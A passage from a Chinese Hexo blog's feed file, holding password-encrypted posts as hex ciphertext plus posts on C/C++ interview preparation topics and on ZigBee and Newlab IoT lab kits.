cc8ff0168e8986a0f924dd0a7bbca23809397ccb907060ccb04c3d1534a313e48f0e70747fcee93dc75f647f2c31dd837cb52fffb8f387f821d4769c20647459d112e5dabb0e601511885c7ee800b0651d9f6bae24a5a0f5e686efc722f122647ab95f81f5effa7b9a239dc5b02f2544e5eced12340fe0074d6aae51470907240526533d45fd148e16431272b1e3a3eaf2deb1696089cfa89e92b87a8fe281111b802b4461efb369dcd0612e0aa07cd39237f78d24ea2de92eea923203e628fbd386841e8a4388eea94966fa3d8ce1944abb91cbacee88a8bbe1f6ecaad5a186f9cbeb7f959d217e56d1848d7f15ff3aebbd9446c6447b56a1903fee57fcd1edd42d6368efbc5b6cab9d8ee7809eec160b065a57950c47e52d475969a2b41f62abb60bf47561dc3124c7fa7d2d5be8270fd439bdd230dec24c7dc05c71e5b263a612c4a8cfe7f73914718f11e548dfec8de137b9843cb23aa33f77ecccf97a9070f2245f65ed888087f688d93636fbb0a07e3e30555cd39608755d611bc5fb56822e4a313a1f3957d4eb99a759f05f7e01c3a68322706940b6ba57a6151880b717efe454eda9a6800643a2cda3f8bc2a181bfcdc6f8424dc67577cb92570b299fb5306a16784de6975cb2bdd186c7495bc3bcfa7d18d86940638f912d683dc109d31e8a9c66aed53b14c68996ae35d9736631a2f92c077e382aa48994df1c90ea1ac86db64ea5870aa3b4d04edd9c8ffdfa2d30fe214265f1b87aca5c2165257dd58e96b2d08849532e647de8cafc5240495a06de573d35f09de857848bd415e4c37d18a3a5d6ae0540bac5ec9e5751b0030f3e8a459475afcf6b108180a1a05647758fe7af02e01c028d6ce33f593132cb825e8e7cbc1a9e80017c342f8e03762d1131a2d937cf88bd00dfde9d89ca99d33f4161aa7ba64529636e09d716b1b7ad6028e0bebede7aeb2bdaab835238aafe578a0467aaf596eb08ffa3d69bd4f66935bd2edaade42c71bda457ff34c4290d0a2ecd5282ad765b013db93da3fbb6d142a88591bfbf391fc426af720d83e69094e56e6b816398d9ac0817dddeb3467cbb71a002d1540a73c44c1f2964562872496754d965ced48cd258ed9494a863f842cf89cda135f8e7c91b53a448135d3046f0d6e08eacf3dceba7321946fc10d81198c66070ca91a79447814da1c160a84d907dcc93b5a5270634623a750553404bbd8e6b1069d489e49ff0e3f7542e7cd0a5d38ef40e79a80c0163e877fb00a1af09ba21c3ed70f991eb1cc56c899803ff85e8ac464186c3c243dabe137a4acfa590d354c34aecd415d21db16115da2516bec75d4580dd318f62cf2a9259f9d1252a2d7d591fcc5aa1a1e389376cf1f6e040986d729cad8a39ab25a7da8ee4315a11ccf3120e0fc969b7ecc0609262494ce80bfab6e8ddf3c4f0085b83b60187ec83850a5c47e1d17d35c995227a0467fccc2f0b4eb2afb75ab9096ea4e947e5de482d12cf68f4e1b00de32e0fedde24f999fe42367f1d3705bb0f6a0b4fb57855d59926d63400add9e8d8c326d1304761da0e05e011d759aec653a8103e69312c6e2a0ac0109de82340dbf2c5db13917902a0a2cc2c9d3d62a3e35a7cb3f0cfdd14fa87bc71e8fff40a2a2869152a69c05e6673e0ccaf3c42e9c2ce0b230762d536f7cf5dca3395e6b0ab7e88341c41945bb5d1e787cb4bb04e369e2b13898e35d7939f6c2700f7331274b0e5c9440e4ab9d2c55bb7be7a71d09f8c39447645c09b825f792470d8c2c98dfbe8b25cc6fa34d2f2c794837af2efbfd2765f7625a331572dd08d46bfcf08845fe33a897cf16581a990ee74ddec2f1927a4e1b0f7b11a2fded7a3a1febb25678366231880e3494c47be1cfc9c4c4bbc26b81e9ee8cc52b73284e18674f884e34d21fb41ee15abd5677d33c6d513a9ed74475f6233c098d196f8b2d1b491d3f4c4344e437934ff0223031a0c51a7411eefdf19ef713b37b26979d96ee5c8cb4c2629dc8a0c573b130ab059e89c5baa2ce2f5b26e45d511db1981f97d6058ee6cf16b6760eec371272a68ee70be342c04707dd61eb994fe25839ec818f6c4eb902218e440245b9eb53c4eecd57e280d4894343022f6a51d98675b44303ecda6e08294f663494d439100cbdf16b9e552b3023befcc8a8f03004f36d689f0c03d4eb46ed4152ddc620e2d6327ae74a655ea2edfe2b93741575e51daacfc48a431b258cd0a736d1232de388f8eddb1dc17b75a6abaafc59144460d8ab0fc19e6b7ac9cd3adbc2f774ad3eb917da69dab57f1e6fdeeb83e82d8e8d13535d8b8f1cf54d826e2cc18dc955def4b417ee7112b877d1aaf7a24f9afae8271aee434c763cecb582ea85147eb7bca3c732de670b3a7d51fb9e84b6246efed89e341a049d9616f24357b687916e84ee720b913c9ca971dada3d4cc97ec93aa7eec320dbd83a529194c1f5f3d5fa2144724877cbf9b5dfc18549e93d3556ca3c6cd1acbb810a00eab76f94428e3991fa4cc67381b12b1b766fe9c4f781f52cfa4ed8d403ce2e2a8dace30a863c17804f76e133533683e757f4577ea8776e82999730fae22bceebc494fd2c4a619be85108a40004f1d93e85bc65fc8fc1a12f803ed264a84648e4285f5fc3ddd69c50ded6a12b2150728f4ec3dbd192e1ce1f881c22a2fbd8ce743e9642089f827f0a1e0fbbb16269f4fbc3d3197f4a06523c0082e36b764e184985a849c0f2bd3600caa91945a8ea7c06022b3b00debd5c0e14be50e3e96fbf606f20cef6da496948bef3dce723859871e0a0e39de9c61d799c0e1a5a4b0b961020463fbd9102e4d18c68519ec401e4149054411e53498cf232e5b6774a5b078ff322601c324ff37c46d5bfbdfc338f8c2e11f19e32b5644a100d83d10df672be67bd8b05231eff1e6bc1b6b49b4ae406128c83081eb5648ed2dfceba5db57fffa01546dd5170cf2a332ac7c914d8e41f8057fa961ffc7dbefbefed440750a90ea5c91341239bc3f277216e8ffbadc530fb58f769d751c7350babb6b729210f9aeeb99bc98afa89847892d9c7d3999949fec007d93f0cac6151f4e9d490134f6f1652c6d89aec0a326e139f82ae2e95b19936fdcc9cf1ee4db5fe7e48edcd37d416a59bca33fe070f2ee76c71e4889686108cd7544caf4e150f700ee03cebd47ae47e6eee8ac53d6fa69678f432a079284199e989ba467f28532bd1e4c272ea8c636b902ef461ee8431c52a5bcde5f0543f2b5b0947db47414367e2777ac306ec163f3d8ab384f6ef025f4e9323b1956f9bbfc8a74cb8e81df011024ebd410d9b5e428c00ba0839ea32faf06e1b266d85cddf6a8a0d18988760654dd0aa8313725e81e20825392603c771103840deecd19031704c277e988841fb7713a371f1f399b8599506fa3dd87db268a2d46195643622cc3daced5a31326d0f277a382150ff832f66d9a7464919b623db6f82b518c38d84bf2ec053749e8ecd970eedee6740406e611e065cc96a636e575590105752fc17c08844d14c17291a01e4d9acc14d17eff5dc294d8f013dd0bb3da2667621ecdd4d67e2d6e75c8abf487d33560ffce8576b03985adfdbd56e3407971fea6050aca7142b0a8e35d6fde5d5909a7a8babebe99d8913afda8f13e3ff9fac16b5c55b321d26def4e939bfaba5dffc25dfbd5e72f0820a343d2e722d4f87edcbb6c480baeb0cbf96eb8a2e90e2ec39770dce8dab7ab1a05921fbea3e07b3fed3af79f1f95d0a257996456efd10f9583355905258574f4dae3921d742a51ab7f0c47fdb153b24447d5815bf186862e07c90f9c448d769cc9b2eac578a022f627799e4a4fd9fb5825d0f9f81042ba481b7b648f52bc9dbe364c8472ad98fcc25d5a9f4cfe40578f29fc5a1f6162a8e7b07133fa2cfa3fd4042860c75c4a33b162ee0f0be355bc2b625fd19034465d13698f8f79344e0bcd0142fda53047336a93dc20d8fd3106f17782fb4b8030f1b1a6e04e891eb56776428a7fd5e6eb6d5040c03ae53a03d2bf0825b1cc8a546d2922997bdb1c31fe36939dcc8470f5a2ff57a7aecdb162e17e6f895cc9ffa3999fd40e073f6572a43dbfb4afcbec75d760035abdf792f9e6db59c8ebc8b443509233444f8bdfcc313f54a98d017ad01430d0029640bbed52b8639bece52619008d9263632544fef4fc4000eb4fc5de83df779e4266d3fc3eef1a365917d9556c3838c1e1538d1f837c1870f067b3f25ddaa09839b5463da6da6499cf11694b34b14374ac86ed391d42343c619f47c82b2adf0aedc6952abb058ea5e24bffdd11fc9269f5f3fdbcd5fe16c5a2b35f50eb8f6735f5f19b7f618bd5fac181e802e8a4220165f01ff795143ff09c164987441ae0003690951a5de5857d2ae73b85133f1ecb5a2ec60fd980224f8799de740c7684f3f25ef7a116bbadfaedec4d96b1d89fc9f706340e00cc9acba1361588ee5ea8cc24e310f8cde34b651d4ec198bb529e6f13041722b06d0cf81120e020a85fff063362704d6dce4ab4bf7da945e33b346c94ae4b26789f06f6592985dacf8739e316efcc90205f4f69fac3a1f49f9b34304952be6f70c17925de122733d26a00db675088f868ced1e035068649e4303e0f3dc102c12f9cbd0a039ce66ac396efe7b6512d6a5ceba29d1fcf781344aabde557236fe6d17d178f972b83846341a09d60316c3c4dbf719580b084c3aa66930460c6104589f597934e5a0fb0a142f0950da33eba1bf3a801c2b0010db9e06c1c5b4f292fc6747a2dea9f2a92f2d4cca8aae1d5a5daa440ca345e3c4a02a4b21e5bf03c08665f5a4d016657acd4df0dca26fcf02f736de871858818774d8ad6c70643a649dca5a33d064bc7a3a97cf544858ac327d7d31bea6e263b2832c77064eac7db8fc55d1fda02dd4454bed0a3b1ee330ef6d006f72465ec4c49f422c77c08ccf62afc79a01c34b7d16186cceec261661f17a0af44c2915e5178a61a9c50a44709bff1150a8a51526446dfdf027405e5d631b4f4153a88df6189d21b1e1d848cea29a3083ececa682617da76f124ff18d785c340717671e6e1d964013b4d51154edb8ec43cb86f25d00ca2a82294e5361b07762415f8e6a02b08563aa667521d9711f2cb6dd096c44a4d48a610f0b019f28c091137df70ba08f2548b5350f2f79c1653293e5cdfe071f8ac0ff7347665583641bdc89d2736c437c9267c6feb13ae7207b118d2e7214ebc3194f52a14ad6907e89508837866858e9b12c2758db72af559ed86d2ba5478b519e5dc4ddcec8e0e6e82708357df6acd402fdb18b93e7678026684127f6a347a3d36ef5ec9f8eb48d58250e7baaefe93153315fa4466a4e522b665fb9013b204210729457da826f9fbf7c0f215d80d894d5bf75528e9b0a9d3f978724e7bfee67b80c1ac376fe8b8fdecf149f32ad29bad7c2a73e4dbc48f373f7d4440f932de7586982ab8697d12432964ebce25f369a44c3f45f8101b24fcd619cff99e662c0307c1a131f3385bde2f5a05050090bd82336d79165484514ccb7e1de6acedaccfce98f62f54b61383017c509935744493238bfc836a1bcf1bae8193892c10bddb3bca1320218dd7499ecb4bd2b6649f57d5778f5b23217ed65ff95fbe253fb227eef7f4114d041a8c86afd0f8aaa218ef69d06e686554465f71b8e53b2b3a69c429d1d380dcae33336df94adcac4f1a1919e9d7d4eb763fa355c580564a234314cffda9fb4ba3c8a1e2870d25cd5925b46358ed08b89a1670e62d6889fa9a0fa23427ab52f3b1c7105f23a321d4a9fbac3d0daf56895f583031038aca5640df91963397b8ce86b723c61c6679d428f9c76d5fbc1c27cb68b2ece6427f35410fcfeb840e1d494ca6889a8b8edf736cf95c45b42e5ccaa9829fbfffae4639ec6d9a9f8b86b087093827feccb2f8dc6e528993dc749deb318ebea538f6d5023be894cbe161eb10091203ad747fd4c6d5c521dd3010a88d9ec949b81cbd769910c63cc1c66</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WTL </tag>
            
            <tag> Sqlite3 </tag>
            
            <tag> Json </tag>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>听别人面1.0</title>
      <link href="/2022/11/22/%E9%9D%A2%E8%AF%951-0/"/>
      <url>/2022/11/22/%E9%9D%A2%E8%AF%951-0/</url>
      
        <content type="html"><![CDATA[<p>临近出去实习的日子，很快，一切都感觉没抓住。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>面试其实也挺玄学的，但大致会基于以下两点吧。</p><ol><li>学历</li><li>实习还是有过工作经验</li></ol><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-学历"><a href="#1-学历" class="headerlink" title="1.学历"></a>1.学历</h2><p>从群友那吸取了点经验。</p><p>一本的有机会去大厂面试，第一轮都是算法题，过了之后是看还有别的面试还是直接hr面，hr面过了基本都稳了。</p><p>大专是肯定摸不到大厂的，中小的企业有就不错了。</p><blockquote><p>这里的核心点就是，如果你不是高学历的，而且基础开发岗位，直接问算法的不会这么多，除非你选的岗位要求有介绍。</p></blockquote><hr><h2 id="2-工作经验-无"><a href="#2-工作经验-无" class="headerlink" title="2.工作经验-无"></a>2.工作经验-无</h2><p>应届实习生在没有什么项目经历的情况下，大多都是八股文类型问题。</p><blockquote><p>直接百度语种+八股文，可能会有出入，但是基本功要扎实就要背要记住</p></blockquote><p>最常见的比如：</p><ul><li>关键字的使用和细节</li><li>编译详细步骤</li><li>内存分区</li><li>函数</li><li>面向对象语法</li><li>…等等</li></ul><blockquote><p>不排除会问数据结构和算法，怎么圆看个人</p></blockquote><p>如果有复刻过什么项目写在简历上了，那么就要做好被提问的准备。</p><hr><h2 id="3-工作经验-有"><a href="#3-工作经验-有" class="headerlink" title="3.工作经验-有"></a>3.工作经验-有</h2><p>如果是有工作经验的，会直接从你的简历问项目经历，你负责的模块，具体怎么实现，有没有遇到什么bug以及怎么处理。。。</p><p>除此之外如果也有考察八股文也不稀奇，基础功嘛，只不过有些公司可能不会问了。</p><p>然后就是：</p><ul><li>协议</li><li>操作系统的应用</li><li>网络模型</li><li>开源项目阅读和了解还是使用</li><li>阅读过哪一类书籍</li><li>为什么从上一家公司离职</li><li>今后有什么规划和打算</li></ul><blockquote><p>其实有工作经验也挺尬，因为上一家很有可能没有学到什么技术然后就离职了，那么问起老东家的项目和你自己实战经验就会很空缺。</p><p>其次就是感觉都挺反感但是都有问的离职原因。。</p></blockquote><hr><h2 id="c-搜一搜面试题"><a href="#c-搜一搜面试题" class="headerlink" title="c++搜一搜面试题"></a>c++搜一搜面试题</h2><h3 id="1-八股文"><a href="#1-八股文" class="headerlink" title="1.八股文"></a>1.八股文</h3><h4 id="变量的声明和定义有何区别"><a href="#变量的声明和定义有何区别" class="headerlink" title="变量的声明和定义有何区别"></a>变量的声明和定义有何区别</h4><h4 id="右值引用是什么？跟左值有何区别"><a href="#右值引用是什么？跟左值有何区别" class="headerlink" title="右值引用是什么？跟左值有何区别"></a>右值引用是什么？跟左值有何区别</h4><h4 id="volatile关键字"><a href="#volatile关键字" class="headerlink" title="volatile关键字"></a>volatile关键字</h4><h4 id="const和static用法"><a href="#const和static用法" class="headerlink" title="const和static用法"></a>const和static用法</h4><h4 id="typedef和define"><a href="#typedef和define" class="headerlink" title="typedef和define"></a>typedef和define</h4><h4 id="struct和class的区别"><a href="#struct和class的区别" class="headerlink" title="struct和class的区别"></a>struct和class的区别</h4><h4 id="c-x2F-c-函数编译时有什么区别"><a href="#c-x2F-c-函数编译时有什么区别" class="headerlink" title="c&#x2F;c++函数编译时有什么区别"></a>c&#x2F;c++函数编译时有什么区别</h4><h4 id="内联函数和宏定义的函数区别"><a href="#内联函数和宏定义的函数区别" class="headerlink" title="内联函数和宏定义的函数区别"></a>内联函数和宏定义的函数区别</h4><h4 id="c-x2F-c-编译四大步骤"><a href="#c-x2F-c-编译四大步骤" class="headerlink" title="c&#x2F;c++编译四大步骤"></a>c&#x2F;c++编译四大步骤</h4><h4 id="c-x2F-c-内存分区"><a href="#c-x2F-c-内存分区" class="headerlink" title="c&#x2F;c++内存分区"></a>c&#x2F;c++内存分区</h4><h4 id="简述堆栈的区别"><a href="#简述堆栈的区别" class="headerlink" title="简述堆栈的区别"></a>简述堆栈的区别</h4><h4 id="c-传值方式有哪几种"><a href="#c-传值方式有哪几种" class="headerlink" title="c++传值方式有哪几种"></a>c++传值方式有哪几种</h4><h4 id="c-强制类型转换怎么用"><a href="#c-强制类型转换怎么用" class="headerlink" title="c++强制类型转换怎么用"></a>c++强制类型转换怎么用</h4><h4 id="静态变量、全局变量、局部变量特点"><a href="#静态变量、全局变量、局部变量特点" class="headerlink" title="静态变量、全局变量、局部变量特点"></a>静态变量、全局变量、局部变量特点</h4><h4 id="计算机源码、反码、补码"><a href="#计算机源码、反码、补码" class="headerlink" title="计算机源码、反码、补码"></a>计算机源码、反码、补码</h4><h4 id="指针-空指针、野指针、函数指针等"><a href="#指针-空指针、野指针、函数指针等" class="headerlink" title="指针-空指针、野指针、函数指针等"></a>指针-空指针、野指针、函数指针等</h4><h4 id="指针和引用的区别"><a href="#指针和引用的区别" class="headerlink" title="指针和引用的区别"></a>指针和引用的区别</h4><h4 id="new-x2F-delete和malloc-x2F-free的区别"><a href="#new-x2F-delete和malloc-x2F-free的区别" class="headerlink" title="new&#x2F;delete和malloc&#x2F;free的区别"></a>new&#x2F;delete和malloc&#x2F;free的区别</h4><h4 id="面向对象四大特性"><a href="#面向对象四大特性" class="headerlink" title="面向对象四大特性"></a>面向对象四大特性</h4><h4 id="STL模板"><a href="#STL模板" class="headerlink" title="STL模板"></a>STL模板</h4><p>在C++标准中，STL被组织为下面的13个头文件：<code>&lt;algorithm&gt;、&lt;deque&gt;、&lt;functional&gt;、&lt;iterator&gt;、&lt;vector&gt;、&lt;list&gt;、&lt;map&gt;、&lt;memory&gt;、&lt;numeric&gt;、&lt;queue&gt;、&lt;set&gt;、&lt;stack&gt;、&lt;utility&gt;</code></p><blockquote><p>能问的其实挺多的，一个stl就有这么多个容器可以问</p></blockquote><hr><h3 id="2-网络"><a href="#2-网络" class="headerlink" title="2.网络"></a>2.网络</h3><h4 id="描述TCP协议"><a href="#描述TCP协议" class="headerlink" title="描述TCP协议"></a>描述TCP协议</h4><h4 id="描述三次握手过程"><a href="#描述三次握手过程" class="headerlink" title="描述三次握手过程"></a>描述三次握手过程</h4><h4 id="描述四次挥手过程"><a href="#描述四次挥手过程" class="headerlink" title="描述四次挥手过程"></a>描述四次挥手过程</h4><h4 id="描述UDP协议"><a href="#描述UDP协议" class="headerlink" title="描述UDP协议"></a>描述UDP协议</h4><hr><h3 id="3-windows"><a href="#3-windows" class="headerlink" title="3.windows"></a>3.windows</h3><hr><h3 id="4-linux"><a href="#4-linux" class="headerlink" title="4.linux"></a>4.linux</h3><hr><h3 id="5-最后"><a href="#5-最后" class="headerlink" title="5.最后"></a>5.最后</h3><p>诸如此类，至于windows和linux择一发展吧，全栈吃不消的，顶多是有了解会cv大法。</p><hr><h2 id="还有就是"><a href="#还有就是" class="headerlink" title="还有就是"></a>还有就是</h2><p>大专群友几次面试过来，公司水平参差不齐，有的还是临时找c&#x2F;c++岗位的，这就导致面试问不到点子上或者给7、8k的钱想让你干15k的活。</p><p>地区也是一个很大因素，一线城市房租日常消费高，所以工资也会好看很多。</p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>核心就是简历，其次面试就是口才</p><p>自信为主，实力为辅——这句话就是江湖人称唬住了10k，唬不住5k，然后实力就是看你能在这个公司留多久了，能不能度过实习期或者试用期，转正之后又能干多久。</p><blockquote><p>疫情这几年互联网也不好弄，低学历的简直是雪上加霜。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zigbee和newlab</title>
      <link href="/2022/11/22/zigbee/"/>
      <url>/2022/11/22/zigbee/</url>
      
        <content type="html"><![CDATA[<p>昨天和群友随口谈了一下工作，有一些对嵌入式硬件方面有兴趣，而我大概只记得用过zigbee和newlab这么两个东西，而且之前的设备都挺老的，实际上的嵌入式一搜都是什么单片机起步，烧写刻录巴拉巴拉的。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>都是比较老的东西了，同属于物联网阵营。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="zigbee"><a href="#zigbee" class="headerlink" title="zigbee"></a>zigbee</h2><p>翻译过来好像叫紫峰。</p><p>zigbee的几个特点：</p><p>①低功耗。在低耗电待机模式下，2节5号干电池可支持1个节点工作6～24个月，甚至更长。这是ZigBee的突出优势。相比较，蓝牙能工作数周、WiFi可工作数小时。</p><p>TI公司和德国的Micropelt公司共同推出新能源的ZigBee节点。该节点采用Micropelt公司的热电发电机给TI公司的ZigBee提供电源。</p><p>②低成本。通过大幅简化协议(不到蓝牙的1&#x2F;10)，降低了对通信控制器的要求，按预测分析，以8051的8位微控制器测算，全功能的主节点需要32KB代码，子功能节点少至4KB代码，而且ZigBee免协议专利费。每块芯片的价格大约为2美元。</p><p>③低速率。ZigBee工作在20～250kbps的速率，分别提供250 kbps(2.4GHz)、40kbps(915 MHz)和20kbps(868 MHz)的原始数据吞吐率，满足低速率传输数据的应用需求。</p><p>④近距离。传输范围一般介于10～100m之间，在增加发射功率后，亦可增加到1～3km。这指的是相邻节点间的距离。如果通过路由和节点间通信的接力，传输距离将可以更远。</p><p>⑤短时延。ZigBee的响应速度较快，一般从睡眠转入工作状态只需15ms，节点连接进入网络只需30ms，进一步节省了电能。相比较，蓝牙需要3～10s、WiFi 需要3 s。</p><p>⑥高容量。ZigBee可采用星状、片状和网状网络结构，由一个主节点管理若干子节点，最多一个主节点可管理254个子节点；同时主节点还可由上一层网络节点管理，最多可组成65000 个节点的大网。</p><p>⑦高安全。ZigBee提供了三级安全模式，包括安全设定、使用访问控制清单(Access Control List, ACL) 防止非法获取数据以及采用高级加密标准(AES 128)的对称密码，以灵活确定其安全属性。</p><p>⑧免执照<a href="https://baike.baidu.com/item/%E9%A2%91%E6%AE%B5?fromModule=lemma_inlink">频段</a>。使用工业科学医疗(ISM)频段，915MHz(美国), 868MHz(欧洲), 2.4GHz(全球) 。</p><blockquote><p>实际在我很早之前学习的时候确实能感知到几个点</p><p>对于功耗，他能用电池撑很久</p><p>对于成本，他的一个模块价格也还行，自己倒腾也买得起</p><p>对于速率，相比较现在的带宽肯定是很小了，但是放在物联网这种简易传输下用处还凑合</p><p>对于距离，的确，zigbee功耗低成本低自然能传输的距离也小，通过接力能够有效增加距离但是这个结构大了管理维护量化考虑都是个问题，只能说是个办法</p><p>对于时延、容量、安全，怎么说呢，确实没印象了。。</p></blockquote><p>当时好像是西安开元电子啥的公司的。</p><p>反正听抽象，就一台很大的机架，可以简单的走线，然后安置模块，有个集成的控制屏幕，可以用qt写了连接上去。印象里应该是玩过光敏传感器、风扇传感器-根据温度或者气体、声控等一些设备。</p><hr><h2 id="newlab"><a href="#newlab" class="headerlink" title="newlab"></a>newlab</h2><p>这玩意更骚，学了就忘了哈哈</p><p>在网上搜了一下，这个<a href="http://www.newland-edu.com/proshow?product_id=58">网址</a>首页的图片就是当时用的了。</p><img src="/2022/11/22/zigbee/000.png" class=""><p>四个洞是用来固定的好像，因为板子的四个角就是铁的，可以吸住，至于这个供电好像是左边这几个针脚来着。</p><p>反正开发板上面挺多接口的，也分类型。可以装模块玩，蓝牙控制小风扇之类的。</p><hr><h1 id="总而言之"><a href="#总而言之" class="headerlink" title="总而言之"></a>总而言之</h1><p>那会设备真的老，而且也有几年了。以后到底是在windows还是linux开发的工作都不晓得。</p><p>最新一点的也就玩过树莓派，可惜的是都是厂家或者卖家提供的驱动哈哈。或者就是定制系统iso。</p>]]></content>
      
      
      
        <tags>
            
            <tag> loT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音视频开发</title>
      <link href="/2022/11/08/%E9%9F%B3%E8%A7%86%E9%A2%91%E5%BC%80%E5%8F%91/"/>
      <url>/2022/11/08/%E9%9F%B3%E8%A7%86%E9%A2%91%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="800223772591e6ff0e1b80857dd28ec01d5de18707358337ba5a841886f37dff">6f01f71b1ed5370865b491f28c5fc5decef4e0a1f439165a87a0f5b48c5de2f02584e5e6a37ef4d951403651b9a3b0fb0da8646bebaee2aa1417c7f48cd66ff25352e9e3f9f6718307c4ca974d631d49e64f6d64fbc4edd8b23609cca1fb3fe7da294118b420708a4e31299348a74454a5599bf19820cbbc3b08bc4092b5c48a02b6d62b0c15ae99b94b608814bdc972e8072b62873b131d36c06f2707bf0c6ee7cc65e0c27edac573c780bfc79260f9b4c674a41ffd0472d419b516c7d2f91a124c39a5d0654e10e0c8936abbd037628303130de978b2063b0fa97c2683e1e8f786d0a0411341c8adde1d418b39b88f62bbc424ebf1af4efa45e2753f254b59fc1fc5aeb15e316385458034acabfcc9c4b17759caefe4c804e5445c2599cc1fc25c8196921394577acd1c158e15c58d3d6db752f19abeb97b1aaf53c580ad970e135785e1e66d2a136b91e66489f16ed78f7c941c07fc3b8b3276eb4328a4bb3eb1deabcaf78fb52106472ca7cb45e75bcfb824995d20f484926abeb5375e5684b0a89daf5522f92a41eaf70fc95a4399a2259effe7b8d01f09bdf61710648d7a036dc806b0d732c9ac4ce64617156590c4c415e9bc594bf39d2025d7a8181577ba8b4ee587c7eede98f22273158432abcd491099a4c8e1e98e302f68fba18dc1aa5ea13368a3dfeda16d8bef81307e30667a446588ef83013e9fd544ce7c677a217fbc8311ad37313352c3020fb9714eb1c62d8718cd1f6e0568187e9aba96518bffbcafdcd1addcc8c275ef658cc791814dce1bbc6942f918bad0a92f413ce2909eca49706b8993539ced4798bb642d794bf2f06239e06fe14f322523e611a1f87a7b10fe35fa45db78dc2c6acd7a6acbba32d5e540c01f5723497e3dad4ba08c35323da82f9088f141ac7b731f3dc318d68051e9fb279fe873c629df6b9ce0efd3d8955c97e828237a47c6ad879950a4bbdac692e2763f03773f330b4545baeaf2f8126dfd4b3e6456d45aa5fa271a53a3e492ced6258c44904f05aa7ca5dbc954e0f0c51cef90ce395c53869d8279920fd153f5b8eb977217b0e0017a77e4755f2e797a4ff272ccdf074c7813b2a6f69ab2f5142ff332b0f35ade1471e9543b6c2e3cdca7ec22d065de50beb3bd72c189ae99946bf53b772d4cb60a6662391bdd7dd4962dc2d471243ed49bca2679fa19d82a4e005e4ad4076286ef2a17f4d563a7461216d807c6c744b5d77d96381cef845598c224536ccaaea578303444ee85859963f7e2c3cd6e8ef499bb12e6364dbe242afe477f5ad84796f7a559cab7d72bfbb8e7cabf2da21dcaab058d19d74dcf78ed0ba5ae97850e520b9bc4925cb1fb723a67f96b9d11fc206761924db5180ec659f59baade02a8b07a28c1f26e3c6a696b83114171a0f8b83f0b2ea983f9b491569cf81e0b7fd1a5de3409b780539560d974e8013230efd31aa4ff1e1f5fd6355e1d102fee55e7627cc50d28c9e39651ffc9a3b3a2b3de56664a4fa0d6844efd2e75d3b931a3d550523260501a5d50701b0ced4dc7aec7fc4b29f7f8d56d8c0bc512fc7767dafe88a9386589b7e7925ba5c2f5f89c2acc2d33bf95bf05d8105a8b7c2a9392ace197cc4510f9a23a5583900baf56232e33eabada54c5198b97eff9c87f8c61c2a85b1a887fe657558e22e73f90c2580574e8d20f8b02bf2c944508a57fa8a181d9f03326887a04f836f5d9fec0de47d3f3e47553f79b6ebd753edd1cdee38715b2e63729b37f4d97cdb5183bfd05267886eab64f35aaf49d0c99a9cabc35c9937c87fbfb61e1ca39de0c7942047d4d43c20ddc18f564c83ffff248a04d855e52d25fc057d482fb638c599b996fdb284423c824fc8ddbefc5a709039a80947fb72e8bae731b8d893cde3db4f5f03035e4ec77b49e744f393088317d14008682e1534eb865d599b7174e9b3063280beba6b5f51606352bdab8a5718c3b14c03871597c17f2b24c3db042cc6fea71695cc69806d5b00894ab29d5ed5029476df4397e22398058c5751fabf743274b2e1fdb0809f09d8d7ca90ab1136b6b7793869097092250c43366215450e3fa73c4f0e75409d9d6ea11f02f21fa988ac13fdf0795393a621b530cc77a4c77b5a585733a3e6f3f71d5d542aacacd11608fcfd6ff6057071f67ff123ffa5f9fe627406abda398bf6fcdbb93d02d268ec06a2563ddeaecd0f1322066f85e27844438ca4742e494d1a1fd822ca30eda29e93d947e49f3742f92f09771a4112acefba2c9349129a6c4d024b1ad9b747340dc28bfc7283b6d7d9262f349f0245cd5486cd3b48d3ae5d8896d13d957528bd7646327664b3130f77b0c4cb8a0c6590bf282c8788b174ad5007da482d755f38c9534d7091cdac4e21c11db6beef4526bd97f9cc18f75946fd47116d4d5ed89c9c20f9798d732c5b2e9c6dd50c9cca8cd0ff3ea90be50dd6166f0bab0f66fbd3277eba51073c4bb67ff2a69af02ee4002a6360430515f05e2f30916b7766fe61b08da21f77ad7ed8d34bc7fd7cf875a212c129d81b7473185bc19d5df60c0186aa1bb409ab45623d2f6506040f5c34471df14bba746356ca7bd496ab9a2a21ef7340ddabf231335ea0891473bcba1b6c597523f57885d63ce7a3dddaa1882bdea6f570b03e7ee181887550186b444a2c75373cfcde070212b19a860635a25c4224300008abf3cf781c7988916bbddf32517357bb920aa1b24d3d3229515c24d39f86eca00f12019fdcd71962666a59c5ffd8324b4e279e33f